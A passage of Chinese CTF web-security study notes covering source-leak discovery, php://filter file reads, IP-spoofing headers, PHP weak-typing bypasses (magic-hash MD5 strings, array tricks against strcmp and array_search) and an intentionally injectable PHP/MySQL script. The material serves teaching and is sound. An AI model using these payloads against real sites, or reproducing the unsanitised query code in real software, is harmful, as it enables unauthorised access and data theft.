xss</code></li><li>XXE，各种XML存在地方（<code>rss</code>/<code>word</code>/流媒体）、各种XXE利用方法（SSRF、文件读取）</li><li>HTTP协议，花式IP伪造<code>X-Forwarded-For</code>/<code>X-Client-IP</code>/<code>X-Real-IP</code>/<code>CDN-Src-IP</code>、花式改UA，花式藏FLAG、花式分析数据包</li></ul><h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><h3 id="查看源代码"><a href="#查看源代码" class="headerlink" title="查看源代码"></a>查看源代码</h3><p>在线上CTF赛事的Web题目中，网页源代码是一个很重要的思路来源，按F12或右键查看源代码即可。</p><h3 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h3><p>爬虫协议，有时可以通过它看见一些重要的目录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;images&#x2F;</span><br><span class="line">Disallow: &#x2F;f1ag.txt&#x2F;</span><br><span class="line">Disallow: &#x2F;tips.php</span><br></pre></td></tr></table></figure><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>一般在右键源代码中，有时注释隐藏着重要的信息或者tips，或者出题者写下的思路。</p><h3 id="备份文件源码泄漏"><a href="#备份文件源码泄漏" class="headerlink" title="备份文件源码泄漏"></a>备份文件源码泄漏</h3><p>​    常见备份文件后缀：</p><ul><li><p><code>.rar</code></p></li><li><p><code>.zip</code></p></li><li><p><code>.7z</code></p></li><li><p><code>.tar.gz</code></p></li><li><p><code>.bak</code></p></li><li><p><code>.swp</code></p></li><li><p><code>.txt</code></p></li><li><p><code>.html</code></p></li><li><p><code>linux</code>中可能以” <code>~</code> “ 结尾</p></li><li><p><code>ng</code>源码泄露，<code>git</code>源码泄露，<code>DS_Store</code>文件泄漏，网站备份压缩文件，SVN导致文件泄露，WEB-INF/web.xml泄露，CVS泄漏等，可参考以下资料：</p><p><a href="https://www.cnblogs.com/xishaonian/p/7628153.html" target="_blank" rel="noopener">CTF中常见Web源码泄露总结</a></p><p><a href="http://www.s2.sshz.org/post/source-code-leak/" target="_blank" rel="noopener">常见Web源码泄露解析</a></p><p><a href="https://zhuanlan.zhihu.com/p/21296806" target="_blank" rel="noopener">文件泄露</a></p></li></ul><h3 id="include漏洞"><a href="#include漏洞" class="headerlink" title="include漏洞"></a>include漏洞</h3><p>遇到<code>php</code>代码中有<code>include($file)</code>的，一般和 <code>php://input</code>或者<code>php://filter</code>有关，​<code>$file</code>值如果是<code>php://input</code>，就要用post表单构造数据，如果是<code>php://filter</code>，就用下面的payload读取文件base64加密后的源代码，解密后查看源代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encoding/resource=文件名(如index.php)</span></span><br><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure><h2 id="抓包-HTTP"><a href="#抓包-HTTP" class="headerlink" title="抓包/HTTP"></a>抓包/HTTP</h2><h3 id="GET-amp-POST"><a href="#GET-amp-POST" class="headerlink" title="GET&amp;POST"></a>GET&amp;POST</h3><p>Get和Post操作是传参的基本操作，也是CTF中很常见的常规操作。</p><p>GET：在<code>url</code>中提交参数，如<code>/index.php?a=1</code></p><p>POST：可通过<code>hackbar</code>或抓包插入post数据提交</p><p>最直接的区别：</p><p>GET请求的参数是放在URL里的，POST请求参数是放在请求body里的。</p><h3 id="HTTP头部绕过姿势"><a href="#HTTP头部绕过姿势" class="headerlink" title="HTTP头部绕过姿势"></a>HTTP头部绕过姿势</h3><ul><li><p>如果提示需要本地ip或指定ip才能访问，则可在报文头部添加以下几种常用信息段：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X-Forwarded-For</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">X-Client-IP</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Client-IP</span>: 127.0.0.1</span><br><span class="line">(ip地址可以根据需要修改)</span><br></pre></td></tr></table></figure></li><li><p>如果需要验证网页来源，如一定要从谷歌跳转过来的页面才允许访问，则可在报文头部添加：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span>: https://www.google.com</span><br></pre></td></tr></table></figure></li><li><p>如果网页需要验证cookie，我们可以在http头部加入：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span>: u = stupid;</span><br></pre></td></tr></table></figure></li><li><p>除了以上几种常见的情况，还需根据具体情况来使用不同的操作</p></li></ul><h2 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h2><h3 id="php弱类型"><a href="#php弱类型" class="headerlink" title="php弱类型"></a>php弱类型</h3><h4 id="与"><a href="#与" class="headerlink" title="== 与 ==="></a>== 与 ===</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a == $b ;</span><br><span class="line">$a === $b ;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较</span></span><br><span class="line"><span class="comment">// == 在进行比较的时候，会先将字符串类型转化成相同，再比较</span></span><br></pre></td></tr></table></figure><p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="string">"admin"</span> == <span class="number">0</span>); <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">"1admin"</span>== <span class="number">1</span>); <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">"admin1"</span>== <span class="number">1</span>); <span class="comment">//false</span></span><br><span class="line">var_dump(<span class="string">"admin1"</span>== <span class="number">0</span>); <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">"0e123456"</span>==<span class="string">"0e4456789"</span>); <span class="comment">//true </span></span><br><span class="line"><span class="meta">?&gt;</span>  <span class="comment">//上述代码可自行测试</span></span><br><span class="line">    </span><br><span class="line"> <span class="comment">// 观察上述代码</span></span><br><span class="line"> <span class="comment">//"admin"==0 比较的时候，会将admin转化成数值，强制转化,由于admin是字符串，转化的结果是0自然和0相等</span></span><br><span class="line"> <span class="comment">//"1admin"==1 比较的时候会将1admin转化成数值,结果为1，而“admin1“==1 却等于错误，即是"admin1"被转化成了0,为什么呢？？</span></span><br><span class="line"> <span class="comment">//"0e123456"=="0e456789"相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等</span></span><br></pre></td></tr></table></figure><p><code>php</code>手册：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">当一个字符串当作一个数值来取值，其结果和类型如下:如果该字符串没有包含'.','e','E'并且其数值值在整形的范围之内</span></span><br><span class="line"><span class="comment">该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$test=<span class="number">1</span> + <span class="string">"10.5"</span>; <span class="comment">// $test=11.5(float)</span></span><br><span class="line">$test=<span class="number">1</span>+<span class="string">"-1.3e3"</span>; <span class="comment">//$test=-1299(float)</span></span><br><span class="line">$test=<span class="number">1</span>+<span class="string">"bob-1.3e3"</span>;<span class="comment">//$test=1(int)</span></span><br><span class="line">$test=<span class="number">1</span>+<span class="string">"2admin"</span>;<span class="comment">//$test=3(int)</span></span><br><span class="line">$test=<span class="number">1</span>+<span class="string">"admin2"</span>;<span class="comment">//$test=1(int)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">So that<span class="string">'s why " "admin1"==1 =&gt;False "</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/02/07/12ScvV.png" alt="12ScvV.png"></p><h4 id="md5绕过-Hash比较缺陷"><a href="#md5绕过-Hash比较缺陷" class="headerlink" title="md5绕过(Hash比较缺陷)"></a>md5绕过(Hash比较缺陷)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'Username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $logined = <span class="keyword">true</span>;</span><br><span class="line">    $Username = $_GET[<span class="string">'Username'</span>];</span><br><span class="line">    $password = $_GET[<span class="string">'password'</span>];</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (!ctype_alpha($Username)) &#123;$logined = <span class="keyword">false</span>;&#125;</span><br><span class="line">     <span class="keyword">if</span> (!is_numeric($password) ) &#123;$logined = <span class="keyword">false</span>;&#125;</span><br><span class="line">     <span class="keyword">if</span> (md5($Username) != md5($password)) &#123;$logined = <span class="keyword">false</span>;&#125;</span><br><span class="line">     <span class="keyword">if</span> ($logined)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"successful"</span>;</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">"login failed!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>大意是要输入一个字符串和数字类型，并且他们的md5值相等，就可以成功执行下一步语句 </p><p>介绍一批md5开头是0e的字符串</p><p><strong>0e在比较的时候会将其视作为科学计数法</strong>，所以无论0e后面是什么，0的多少次方还是0。</p><p>键入<strong>md5(‘240610708’) == md5(‘QNKCDZO’)</strong>成功绕过！</p><p>收集md5开头是0e的字符串（来源于网络）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br></pre></td></tr></table></figure><h4 id="json绕过"><a href="#json绕过" class="headerlink" title="json绕过"></a>json绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'message'</span>])) &#123;</span><br><span class="line">    $message = json_decode($_POST[<span class="string">'message'</span>]);</span><br><span class="line">    $key =<span class="string">"*********"</span>;</span><br><span class="line">    <span class="keyword">if</span> ($message-&gt;key == $key) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"fail"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"~~~~"</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输入一个json类型的字符串，json_decode函数解成一个数组，判断数组中key的值是否等于 $key的值，但是$key的值我们不知道，<strong>但是可以利用0==”admin”这种形式绕过</strong>.</p><p>*<em>最终payload *</em></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">message=&#123;"key":0&#125;</span><br></pre></td></tr></table></figure><h4 id="array-search-is-array绕过"><a href="#array-search-is-array绕过" class="headerlink" title="array_search is_array绕过"></a>array_search is_array绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!is_array($_GET[<span class="string">'test'</span>]))&#123;<span class="keyword">exit</span>();&#125;</span><br><span class="line">$test=$_GET[<span class="string">'test'</span>];</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($test);$i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>($test[$i]===<span class="string">"admin"</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $test[$i]=intval($test[$i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(array_search(<span class="string">"admin"</span>,$test)===<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"false"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先判断传入的是不是数组，然后循环遍历数组中的每个值，并且数组中的每个值不能和admin相等，并且将每个值转化为int类型，再判断传入的数组是否有admin，有则返回flag。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: test[]=<span class="number">0</span><span class="comment">//可以绕过</span></span><br></pre></td></tr></table></figure><p>官方手册对array_search的介绍</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed array_search ( mixed $needle , <span class="keyword">array</span> $haystack [], bool $strict = <span class="keyword">false</span> )</span><br></pre></td></tr></table></figure><p>$needle，$haystack必需，$strict可选  函数判断$haystack中的值是存在$needle，存在则返回该值的键值 第三个参数默认为false，如果设置为true则会进行严格过滤。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">array</span>(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">var_dump(array_search(<span class="string">"admin"</span>,$a));  <span class="comment">// int(0) ==&gt; 返回键值0</span></span><br><span class="line">var_dump(array_search(<span class="string">"1admin"</span>,$a)); <span class="comment">// int(1) ==&gt; 返回键值1</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>array_search函数 类似于 == 也就是$a ==”admin” 当然是$a=0  当然如果第三个参数为true则就不能绕过。</p><h4 id="strcmp漏洞绕过-php-v-lt-5-3"><a href="#strcmp漏洞绕过-php-v-lt-5-3" class="headerlink" title="strcmp漏洞绕过 php -v &lt;5.3"></a>strcmp漏洞绕过 php -v &lt;5.3</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $password=<span class="string">"***************"</span></span><br><span class="line">     <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strcmp($_POST[<span class="string">'password'</span>], $password) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Right!!!login success"</span>;n</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Wrong password.."</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>strcmp是比较两个字符串，如果str1&lt;str2 则返回&lt;0 如果str1大于str2返回&gt;0 如果两者相等 返回0</li><li>我们是不知道$password的值的，题目要求strcmp判断的接受的值和$password必需相等，strcmp传入的期望类型是字符串类型，如果传入的是个数组会怎么样呢</li><li>我们传入 password[]=xxx 可以绕过 是因为函数接受到了不符合的类型，将发生错误，但是还是判断其相等</li><li>payload: password[]=xxx</li></ul><h4 id="switch绕过"><a href="#switch绕过" class="headerlink" title="switch绕过"></a>switch绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">"4admin"</span>;</span><br><span class="line"><span class="keyword">switch</span> ($a) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"fail1"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"fail2"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"fail3"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"sucess"</span>;  <span class="comment">//结果输出success;</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"failall"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>原理和上面一样</p><h4 id="is-numeric（）、int-强制类型转换"><a href="#is-numeric（）、int-强制类型转换" class="headerlink" title="is_numeric（）、int()强制类型转换"></a>is_numeric（）、int()强制类型转换</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$flag = <span class="string">"xxxx"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'time'</span>]))&#123; </span><br><span class="line">        <span class="keyword">if</span>(!is_numeric($_GET[<span class="string">'time'</span>]))&#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'The time must be number.'</span>; </span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'time'</span>] &lt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>)&#123; </span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">'This time is too short.'</span>; </span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'time'</span>] &gt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>)&#123; </span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">'This time is too long.'</span>; </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">                sleep((int)$_GET[<span class="string">'time'</span>]); </span><br><span class="line">                <span class="keyword">echo</span> $flag; </span><br><span class="line">        &#125; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>知识点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int()，不能正确转换的类型有十六进制型字符串、科学计数法型字符串</span><br><span class="line">is_numeric()支持普通数字型字符串、科学记数法型字符串、部分支持十六进制0x型字符串</span><br></pre></td></tr></table></figure><p>先判断是不是数字，然后再进行int长短的限定判断，也就是只能限定在5184000L&lt;  time &lt;  7776000</p><p>通过is_number() 能传入科学计数法，来进行绕过。</p><p>所以根据int不能处理科学计数法，而在is_number上能处理来解决。</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h4 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h4><p>按照参数类型分类，按数据库返回的结果分类等。</p><h5 id="按照参数类型分类"><a href="#按照参数类型分类" class="headerlink" title="按照参数类型分类"></a>按照参数类型分类</h5><p>按照参数类型可以分为两类:数值型、字符型</p><p>简单来说，就是：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">数字型注入</span><br><span class="line">加单引号 错误出异常</span><br><span class="line">and 1 = 1 正常</span><br><span class="line">and 1 = 2 异常</span><br><span class="line"></span><br><span class="line">字符型注入</span><br><span class="line">加单引号 错误出异常</span><br><span class="line">and '1' = '1 正常</span><br><span class="line">and '1' = '2 异常</span><br></pre></td></tr></table></figure><h5 id="数值型"><a href="#数值型" class="headerlink" title="数值型"></a>数值型</h5><p>程序拼接的变量值没有被引号包裹。数值型注入是无视php的gpc或者addslashes、mysql_real_escape_string,mysql_escape_string或者其他对引号有转义函数的影响的。如果程序没有对关键字或者特殊符号过滤或者过滤不严(比如没有过滤union、select等关键字,可以使用联合注入,过滤了union、select等关键字,可以用盲注或者报错注入等方法)</p><p>eg:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE IF NOT EXISTS &#96;test&#96;;</span><br><span class="line">CREATE TABLE IF NOT EXISTS &#96;news&#96; (</span><br><span class="line">  &#96;tid&#96; int(10) unsigned NOT NULL AUTO_INCREMENT,</span><br><span class="line">  &#96;title&#96; varchar(30) CHARACTER SET utf8 NOT NULL,</span><br><span class="line">  &#96;content&#96; varchar(256) CHARACTER SET utf8 NOT NULL,</span><br><span class="line">  PRIMARY KEY (&#96;tid&#96;)</span><br><span class="line">) ENGINE&#x3D;MyISAM  DEFAULT CHARSET&#x3D;utf8 AUTO_INCREMENT&#x3D;3 ;</span><br><span class="line"></span><br><span class="line">INSERT INTO &#96;news&#96; (&#96;tid&#96;, &#96;title&#96;, &#96;content&#96;) VALUES</span><br><span class="line">(1, &#39;新闻1&#39;, &#39;这是第一篇文章&#39;),</span><br><span class="line">(2, &#39;新闻2&#39;, &#39;这是第二篇文章&#39;);</span><br></pre></td></tr></table></figure><p>sqlinjection.php(test on mysql 5.5.38)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">$conn = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'bad!'</span>);</span><br><span class="line">mysql_select_db(<span class="string">'test'</span>, $conn) <span class="keyword">OR</span> emMsg(<span class="string">"连接数据库失败，未找到您填写的数据库"</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>])&amp;&amp;$_GET[<span class="string">'id'</span>])&#123;</span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    $sql = <span class="string">"select * from news where id=$id"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $sql;</span><br><span class="line">    $result = mysql_query($sql, $conn) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $sql = <span class="string">"SELECT * FROM news"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $sql;</span><br><span class="line">    $result = mysql_query($sql, $conn) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error()); <span class="comment">//sql出错会报错，方便观察</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;新闻&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span 